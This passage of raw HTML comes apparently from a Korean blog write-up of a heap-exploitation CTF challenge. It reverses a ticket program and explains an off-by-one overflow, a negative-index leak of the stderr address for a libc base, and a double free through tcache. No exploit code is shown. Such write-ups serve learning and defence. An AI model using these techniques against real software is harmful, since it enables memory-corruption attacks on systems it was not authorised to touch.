있다.</p>\n</li>\n<li>\n<p>루프를 돌면서 <code class=\"language-text\">exit()</code> 함수를 바탕으로 종료되는 조건을 갖추고 있다.</p>\n</li>\n</ul>\n<h3 id=\"buy_ticket-함수-분석\" style=\"position:relative;\"><a href=\"#buy_ticket-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"buy_ticket 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>buy_ticket 함수 분석</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 38.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB+klEQVQoz21STW/TQBDdQw/8iAhx4fdwjrgCQgIVTvwE/gDwD+DQAKqUfqmHHChVUShIKS5J3Djfie1410nstZ1de3cfcoADEiM9zVzmzXszQwCQf6G22TqzSPPSeWLbI8znrFguM8N5DtcN4XkrUMoRhikojeH7AowZ1Go+yGQUNaaztDHsR43ASxvJSjbWLv80e3V2u3liP7/pMYRhSRgarQtwHkOpAv+L42MKsuh6SDwOTiXiQCAJJfJNgcGX8G7zs/1oMPDA47iI49ikaWbSNDVSyi3+hlLGADCHh4Eh9bfDyofXVuV9nVY+nkaV/VNWqZ8s7qydS9K6sp/OpjMYY/KysSgKwzk3YRiaKIpKEgUg19qUkoujo6AgnR9DYn21yU0/IuM5iDO8Iu1uj7RafdJs+g+Hwyk451oIiTwvEMcJylrKHFobKGWQ53pr+eAgAGm3R1XLcqpOf1l1XVTHY6va6Yzu/7zu3ru+fvfScdh33xfnjMkLSuVFEIgLxvJzSvNvriveUCofB4F8xnmxu7fn7RLbZmi3V5hMpqD0HEJcYrlsY+5GWK+75WCuFMrVJSWybIt1qWyxEA/KjxiPM5KmitRqPiGDwVj3eiPtugudZXGpXQsJvRFG/b6d2VoTAthsACkBrbH1yJh88efdbiWJ2qnV/J1fiP0qo2KRcDsAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        src=\"/static/708349c60c3b5173c1c2a1a2c9772045/37523/6.png\"\n        srcset=\"/static/708349c60c3b5173c1c2a1a2c9772045/e9ff0/6.png 180w,\n/static/708349c60c3b5173c1c2a1a2c9772045/f21e7/6.png 360w,\n/static/708349c60c3b5173c1c2a1a2c9772045/37523/6.png 720w,\n/static/708349c60c3b5173c1c2a1a2c9772045/715a3/6.png 830w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>pass5 구조체</p>\n<ul>\n<li>buy_ticket 함수의 인스턴스 p 는 <code class=\"language-text\">pass5 구조체의 더블 포인터</code> 타입을 갖고 있다.</li>\n<li>해당 <code class=\"language-text\">pass5</code> 구조체의 멤버들을 확인해 보면 동적 분석을 하면서 추측했던 것들이 들어 있는 것을 확인할 수 있다.</li>\n<li>전역 변수로 할당된 <code class=\"language-text\">passes</code> 를 확인할 수 있으며 포인터 구조체 배열로 할당되어 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 31.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABzElEQVQY0x3MQW/SYAAG4P4TJQKGrbRQCrSUipSmwrYs2V/RqwsmHj15JTEePE2nmRMwQec2R+Jgc3RQhbSDsSGjjGUxw8SDft9r3OG5PozAKT/lkPzrTlKbKpIyFcOxKS+qU9+M8N/VLT//Zzapbc9VHtm59WXMlfJk6f1j3N8p4EG1gIViHvOlPM29W0Z2/SFlPAEBKh+FHBJwLyVhKasjkc7BFwjC45+F18/CE4+bZffArvUtfOzUiDm08aKzgeftCppuFx/aNZgjh750PoPxzYhUCUVpWpBpMq7SRDJDU3qWipJKOVH667/N4UYs9nX30raHExfWsU0mlxd42/uClc4WfoyG2LObtDfoo9yt0eswHZawGFOpLiaQSqSRyS0iYyxA1Qzi9bHX4d5V1z4+G6DZa5PheITSSR3P9ovYbzZgukf0wDrEWnuHMt5AGDIXppoQh5xQoeoGlLsaMtl5iLJC2GAYN+OxxvawaZ8MTnE6PiMX5xO8+raFN04V5+MxvvcduK5LPw1MMFzE+M0HVUT5NGVZFVwkAz6igxd1hKIG4XgNXlmrFqxSe7WxgdXWJilaVTzZXcHTwzVUnDpetzZp5aiOQqtM/gGyoSQ2bAJlyAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/e7a31e19a531252edc39367937d1748f/37523/7.png\"\n        srcset=\"/static/e7a31e19a531252edc39367937d1748f/e9ff0/7.png 180w,\n/static/e7a31e19a531252edc39367937d1748f/f21e7/7.png 360w,\n/static/e7a31e19a531252edc39367937d1748f/37523/7.png 720w,\n/static/e7a31e19a531252edc39367937d1748f/302a4/7.png 1080w,\n/static/e7a31e19a531252edc39367937d1748f/c23ad/7.png 1193w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>pass5 구조체 구현</p>\n<ul>\n<li>ida로 분석된 pass5 구조체를 데이터 타입 별로 C로 다시 구현하였다.</li>\n<li>pass5 구조체의 크기는 <code class=\"language-text\">0x30</code> 바이트를 갖고 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 667px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 89.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAIAAADUsmlHAAAACXBIWXMAAAsTAAALEwEAmpwYAAACgklEQVQ4y42T24vbRhTG/W9voH3IS6C00EAgWUrBaWEDJZCEhKSQkhQKJSl7yXZ3bctayZJtXSzNSHM/I2suweu0S8AJ+3H4OA/nx3wzhxkEx3h2wbMpKS4pzTjNGCAJteA/PGG3HrIHr9j9l2xvyPZ/V2sPygJYpay1bjwWg2rWgO4E76QwAEBIL7iXooNR6j6ENsltnNlJYuel/0/ObXw2U4M6wqwkfSssAy+0Y52l2jLlYO1V53dpC8exGnBu6srlbb0SZSnKnC8LVkqtvXXWWGess9ZeufNuq027hYWwaeKTAi1YPMdZihYVQ61swUFrCDdcGIHWiPWMako1RQo1qpWGTgI+IJlKRnD2D6RTnodAlspLa+g62DsKvz2J7pzOvj8PvzmO7vx7lfjz2HQFvTO4WSOsmqarUY9bpaBvTjEJCZsxlnB6SWnMdtyZFEDaLo3Z5RTPE4GqrsUAsnfbka8/WDJV0Yge/t2OT2U2I0XKadWjpb79XX3vV/rzb3T4mN0dkgcH9H/sGi6qXiqHWCuNIJpjQde98d7/8pQ9ek6f/cFevOFXDd8Bp3NNCOTLNk34Iu3yTFCqN8uwN4i9yLu6luNxHYYoywlAv51g9ov4NXz6vgnP2pN3q4tDPDpuohHFeVfNdXCQ4tdZ82fR/lWi1zl+U+xYVXRO49jkFSlJXWDUYlCq77WJfzxLfxrPHwbLgzDdHy+GwQ54leoo9rMFnddlNF9Fl01VCWedBXODVZ01rATAWiGQFSikAeuu0R3prHW2d9Zceb/5htsyZkNHkRpQZnRnwJPOC+etv4G2JycJDI6OyHQqJxMZBHIyEdsKgk++syYTEcfy7Vv8EVr17g18iSWpAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/f957d42e4e021c49471925da6b662490/295bd/8.png\"\n        srcset=\"/static/f957d42e4e021c49471925da6b662490/e9ff0/8.png 180w,\n/static/f957d42e4e021c49471925da6b662490/f21e7/8.png 360w,\n/static/f957d42e4e021c49471925da6b662490/295bd/8.png 667w\"\n        sizes=\"(max-width: 667px) 100vw, 667px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>buy_ticket 함수 내부</p>\n<ul>\n<li>위 사진의 <code class=\"language-text\">check</code> 영역을 확인 해 보면 구조체 배열의 사이즈를 기점으로 비교 조건을 수행하며 총 $48/8+1$ 을 바탕으로 힙 청크 7개를 생성할 수 있게 된다.</li>\n<li>조건을 만족하지 않는다면 <code class=\"language-text\">Sold out!</code> 문자열을 출력하며 함수가 종료된다.</li>\n<li><code class=\"language-text\">One ride ticket</code> 를 선택하였다면 pass5 구조체 멤버 ticket_type, fisrtname, lastname에 값이 써진다.</li>\n<li><code class=\"language-text\">One day ticket</code> 를 선택하였다면 pass5 구조체 멘버 전부에 값이 써지는 것을 확인할 수있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 38.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAACa0lEQVQozzXM209ScQAH8PP/NNO3ntQesosw9SAgogLpXKt12bzihAJF3dJkgJfIUBF7aMnhcriFZihaNsOlM1cOpwzlJtbcqHke+H0bbr19v9v386WuOKyoCNhxN/wekpAX8lU/msNB0B/cKHLModhp+13snLtT4rRlixxWVC+50BDyoXHFB2nIi3vrS5e+8FPitIEqY/WOCp+RqQpOMtJlK6MIvWEEi2aGFxi3l7F6dzlrmC1zm66Ws4bpQr/lN9kLW0VonpGH5pnaRTNz029iSlm9o5w1vKNol47jM30c7RrglGsWTrk+xYk9Qxzfob0QuPvzAq82UeNT36ZZbZx26QiP0V5IPM855bqFa199xdU4/3sdR3s0HNXUm0C76QgtmiQEwx/Be+GFuDODrokYGlVJ8NVbZ1Vf5DyhLpKRPz1Gx9gR5KokaIMfNcPLl079OgaZKoFa/SKo+rYMae2LE1nXKakeXCXdTi8Ztx2RKX80b7TtY3Ahkr0RVlSK+7fSTd0p3B84zjd2ZInQECCikRWiUGZI61D00gv1QULJerJQaI5Js+oMVYNrmN11Y/dnBNvpvfz2fgTh2Gb2WqC5sm4gkqrvTED+LJaXtGUgNPhRN7oCRW8SdM93IlOmITIECXUQPSE/DuOIxzJgdtbAHHxC7jyHvcMoyWZ/YScTy5a4Jfx6zV5a+uQc8u7TvPThH4hGlyEa+oyGxzm0qFOQPsoR0UgI1MtNB8Y27cT81Ql1eBqqDSss33wwbizkzREWo1tMqpR9cL126u2J0OiDeILNCw0B0HMW0DNWFHLdpIcIjX7QszN//wHXWKsQFV4KfwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./9.png\"\n        title=\"./9.png\"\n        src=\"/static/cd8c8b7d7d16359f5d79685a2b658b2e/37523/9.png\"\n        srcset=\"/static/cd8c8b7d7d16359f5d79685a2b658b2e/e9ff0/9.png 180w,\n/static/cd8c8b7d7d16359f5d79685a2b658b2e/f21e7/9.png 360w,\n/static/cd8c8b7d7d16359f5d79685a2b658b2e/37523/9.png 720w,\n/static/cd8c8b7d7d16359f5d79685a2b658b2e/302a4/9.png 1080w,\n/static/cd8c8b7d7d16359f5d79685a2b658b2e/5a791/9.png 1248w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>pass5 멤버 변수 데이터 삽입</p>\n<ul>\n<li>각 firstname, lastname에 AAAA, BBBB 를 삽입하였다고 가정하였을 경우 앞의 그림 처럼 데이터가 들어가 있는 것을 확인할 수 있다.</li>\n<li>사용자가 입력할 수 있는 영역은 두 개의 방식과 동일하게 firstname, lastname 멤버 변수인 것을 확인할 수 있으며 이들을 인자로 사용하는 함수는 <code class=\"language-text\">read_str</code> 함수이며 8바이트씩 입력을 받을 수 있게 설정되어 있다.</li>\n</ul>\n<h3 id=\"read_str-함수-분석-off-by-one-취약점\" style=\"position:relative;\"><a href=\"#read_str-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D-off-by-one-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"read_str 함수 분석 off by one 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>read_str 함수 분석 (off-by-one 취약점)</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 512px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 43.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAABAklEQVQoz41Py27CMBDM//8KV47AH1S0h5ZWcgJycHGa2NhLbCd+bRWhNlVVUUZzWGk0OzNF0zyXpaP0UpZ6v4eqAkr7wwEYM7udJEQxZqoKOLcAUeugdVDKOxeXy7ZQajBmvFyGEHKM6D2GMNE5zBn/REqTsF6LQinfdYkQJ8RgLQIkgJBSTilf8XXjN2OczKuVKKwdvUdjglLuql0f38CczBiSypz0uxykMMLaEf/DbO5NlufQ9x5x6pNSDiHdaxat7RqvRNDSsSNI6QCm8J8jf3He/PHSwKmP2jh+9kJnxDtrbzayqJ/at60gjx154PXr+cjGmrq6Hm6QUsf5uFjwT30gBEreguQ9AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./10.png\"\n        title=\"./10.png\"\n        src=\"/static/44d7ee74edcc16f64a75860cde853a3f/01e7c/10.png\"\n        srcset=\"/static/44d7ee74edcc16f64a75860cde853a3f/e9ff0/10.png 180w,\n/static/44d7ee74edcc16f64a75860cde853a3f/f21e7/10.png 360w,\n/static/44d7ee74edcc16f64a75860cde853a3f/01e7c/10.png 512w\"\n        sizes=\"(max-width: 512px) 100vw, 512px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>read_str 함수</p>\n<ul>\n<li>firstname, lastname을 첫 번째 인자로 받고 두 번째 인자는 8 바이트 를 고정으로 받는다.</li>\n<li>내부 로직에서는 read 함수를 바탕으로 입력을 받게 되고 기본적인 에러 처리가 존재하는 것을 확인할 수 있다.</li>\n<li>하지만 마지막 조건에 <code class=\"language-text\">buf[len] = 0</code> 을 대입하는 것을 볼 수 있는데 우리는 해당 buf의 사이즈가 8바이트이지만 read 함수의 반환 되는 총 item 개수 즉, len 에 값에는 만약 8 바이트를 전부 입력했을 경우 8을 반환할 것이다.</li>\n<li><code class=\"language-text\">buf[8] = 0</code> 이 되어질 경우 한 바이트가 오버플로우 되어 다른 메모리 주소에 overwrite가 되어 질 것이다.</li>\n</ul>\n<h3 id=\"view_ticket-함수-분석-out-of-bound-integer-issues\" style=\"position:relative;\"><a href=\"#view_ticket-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D-out-of-bound-integer-issues\" aria-label=\"view_ticket 함수 분석 out of bound integer issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>View_ticket 함수 분석 (out-of-bound, integer issues)</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAABJUlEQVQoz42PyW7EMAxD8/+/1nuLHjqdJZudZLxbsiXLxfRcoCF45CPI4fb+tn4+9bedLkHfYjxK3jNkBpR/PagPUBetFuW8jcGVXHvIvVI/oWH/Ml7l4+6278NNGXcgZc/C6oHjNYxqeqzjbb5P6/K4mhQYUUIQAMmZjAFE/gO2ru3Ppmw8Uljt8XTJRcLCRFJrZ+5ErRRmlj9gYyoAyStDtRXpIiLM7dRs63hdm8vRgvHoDVgL1geKsSO2lGoImDPF+LoAwCGUlGr7LR9ikmVps9kmP6qolrBMfny6rFS3jrctz7PXOmldtRZjaN+zUtF7FOnDshashIxIFakAAZQiJ1a/YGO51FpaghaRoUs/r+H64GWjecNJw6yL3tt2tO2QM/4BvjN9k0I0dKkAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./11.png\"\n        title=\"./11.png\"\n        src=\"/static/04717b088b4da6c5529d3b37981f6ff3/37523/11.png\"\n        srcset=\"/static/04717b088b4da6c5529d3b37981f6ff3/e9ff0/11.png 180w,\n/static/04717b088b4da6c5529d3b37981f6ff3/f21e7/11.png 360w,\n/static/04717b088b4da6c5529d3b37981f6ff3/37523/11.png 720w,\n/static/04717b088b4da6c5529d3b37981f6ff3/8c857/11.png 761w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>View_ticket 함수</p>\n<ul>\n<li><code class=\"language-text\">Buy_ticket</code> 함수에서 생성한 두 가지 옵션의 passes 구조체 배열의 인덱스를 바탕으로 출력을 해주는 기능을 갖고 있다.</li>\n<li><code class=\"language-text\">index</code> 변수의 데이터 타입은 부호 있는 정수 타입이며 해당 passes 구조체 배열의 첨자 연산을 가하게 되는데 하지만 해당 부분에서 음수 값을 검증하는 조건이 없기 때문에 음수를 입력하여 다른 메모리 주소 번지로 이동이 가능하다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 457px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB7klEQVQoz12QSW/TUBSF/ddhUcqSn+ElSxTRVh1pISqkcYhbPD7PcTw9u4mnfKhuF4gjfdLR1dW5V0fRVzHOn4DVL4PVwkBf2uiaQ+BuyRL5SlyRJRWh2LNe7hHWHtMYWSwG7u9HDKPvLavn9rZRleTrnPR6jju7mPBPbojOvrG91ghOTewvBuvPjwSnOtV3gZzblJcrzOWKoi7Isw3D0PUASdKqSqi5ZJaLrz1ORGuDWDeQIoa8oUskQ1pzyOo3L+njnCYvOQBlUSJl1Y8juO5OVURYkGwT/ljWhC0EjicopGQEuhH6A7QDDLz6f1XXNW3bTh/6/qAqnkhJNwmObU94QhAEPttU4nsgxEgcjQT+gaLYI+V+CjocXpOllLiu0ydJiqZFqhIEOWm6wbJsbNtGCIHnedPi/3p+7hFOjZ9lFLt6muV5zsfj4/7D0RHv331SFVekxEmEYZqYponjOLhCUJYl+7blebdjN9EQhA1PTx3xZsT1Rprm5UhNFEV9VVXYdq4q29mc4uqecHYzkZzckZ7dkZ0vCWePFJc63b3Ofr6mvFpS/3hge65RXazw7hb4UUj31mEUdariPljETwbmz+WE+/AbT1uTmiGpuWPMGigbkA11UBPqFV1aMWwlTVbSdu1Ln/0wHAiCvfoXXgmYB2VF5FsAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./12.png\"\n        title=\"./12.png\"\n        src=\"/static/3286c701c2704020f0f3fc19be100367/34f1d/12.png\"\n        srcset=\"/static/3286c701c2704020f0f3fc19be100367/e9ff0/12.png 180w,\n/static/3286c701c2704020f0f3fc19be100367/f21e7/12.png 360w,\n/static/3286c701c2704020f0f3fc19be100367/34f1d/12.png 457w\"\n        sizes=\"(max-width: 457px) 100vw, 457px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>stderr↔passes</p>\n<ul>\n<li>.bss 영역에 존재하는 <code class=\"language-text\">passes</code> , <code class=\"language-text\">stderr</code> 두 주소의 차이는 0x20이며 만야 index 값을 <code class=\"language-text\">-4</code> 를 주게 된다면 0x20 바이트 차이의 주소 번지를 이동하여 stderr 메모리 영역에 도달할 것이며 다음 출력되는 곳에서 stderr 주소 값이 릭 될 것이다.</li>\n<li>릭된 주소 값을 바탕으로 라이브러리 주소를 구한 후 나머지 필요한 함수들을 오프셋을 바탕으로 얻어올 수 있겠다.</li>\n</ul>\n<h3 id=\"use_ticket-함수-분석-double-free\" style=\"position:relative;\"><a href=\"#use_ticket-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D-double-free\" aria-label=\"use_ticket 함수 분석 double free permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Use_ticket 함수 분석 (Double Free)</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 424px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAABJklEQVQoz5XO24rCMBSF4bz/m3nRoihC0ao9hcaaNGlOTXPYQ5kbcdCZ+flu12aj45Hf77YsRdfpqpK3mzyfxfUqKHVC+Gecv0LDYOua1zVnzIyjHga1LGAMhADPpQQ/Q0UxZhne7fqmmTDWRTFWlaEsjSMQAoyth6YJpFz3LxDGmnMrpTPaLwu4GZQCa1dKwTzDh1DXBYzhPriK1zfWUUMfc9+qi/GT1h+nAKhpLCGesVA36Xr1pxPre80YPGiUMmoN1i5vx22rvA/Wrh+GECcxM+YEB0qjUlHrJKV7OxYiKLVgHC6XWJaa0oixsdbBH0KUOkqNMXGaHMYTIaptBSF6WWKM6TM0z8F74By0DilF+E9osxnznOe5zDKx3Yr9Xn47HH73BWhDdtM3d22EAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./13.png\"\n        title=\"./13.png\"\n        src=\"/static/aec4d84e86c9026b622363e6fa63ad2c/1cfa9/13.png\"\n        srcset=\"/static/aec4d84e86c9026b622363e6fa63ad2c/e9ff0/13.png 180w,\n/static/aec4d84e86c9026b622363e6fa63ad2c/f21e7/13.png 360w,\n/static/aec4d84e86c9026b622363e6fa63ad2c/1cfa9/13.png 424w\"\n        sizes=\"(max-width: 424px) 100vw, 424px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">View_ticket</code> 함수에서 사용되었던 <code class=\"language-text\">index</code> 와는 다르게 부호 없는 정수 데이터 타입을 사용하고 있다.</li>\n<li><code class=\"language-text\">ticket_type</code> 값을 검증하는 조건을 확인할 수 있는데 해당 부분에서 만족을 하게 된다면 메모리를 해제하는 것을 확인할 수 있다.</li>\n<li><code class=\"language-text\">ticket_type</code> 값이 1이 였던 <code class=\"language-text\">One-ride-ticket</code> 은 바로 해제가 되어 <code class=\"language-text\">tcache entries</code> 넘어가게 될 것이다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 517px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 90.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAIAAADUsmlHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB2klEQVQ4y5VSi27bMAz0///ehmFLusaPJnEsyXpQoiiJsoamaTus2JoRB4HQ4XBHgt1+D+PorMvOFXDsHFuXjMvG5tVEa7M2ZG12V+oNACxE7pzLWrenY5rDeYJ+wfloT5aMSWolhexlFDGl9qGIamdtWZYyDvxt5/fTrIOlnEupbWtta9vr+wdaa4jPYvY+EpWSGwau9Zl5of9dMdbOmFJrdS5LRd9/iIcHtdtJIr5LbG1BzCEU7zMiA1CMpbX7nJ1jrXFdEZERmai8JL/TmZmr1pFoQyxvttfFbJ/PfO2K96XvzX6vxtHsdup0cp+LX5ytJYC8riQEShmM+Xzyd7EQwXsiqkQcY/4t+R2xQ2CArFSQMnif/mNhzhFAKoW3rdW6hZAj3j4BEvPt2l7v69q/i33SNilNDopUqG3CyNoShAwh179Ev8XOgNnF9WTWk7kMK65+C7FRYh83JPaUXayBksXssHpioIYUkTsrIwxiGeny6OSo7dmpJ6ueXBAoRyNGvYyrnIybYT7IS6/EqM8HFWcdVejUJcazFycl55m9TbAmr5PXERSBYgiN0g3piphays2HBKn78hWGQxoneZgu46T6Sfaj+DlcHoflcVim3oo5foRc6HikX5hgExIcGlXHAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./14.png\"\n        title=\"./14.png\"\n        src=\"/static/6f3e244131631c7dc77829f654d27dd6/fa2f5/14.png\"\n        srcset=\"/static/6f3e244131631c7dc77829f654d27dd6/e9ff0/14.png 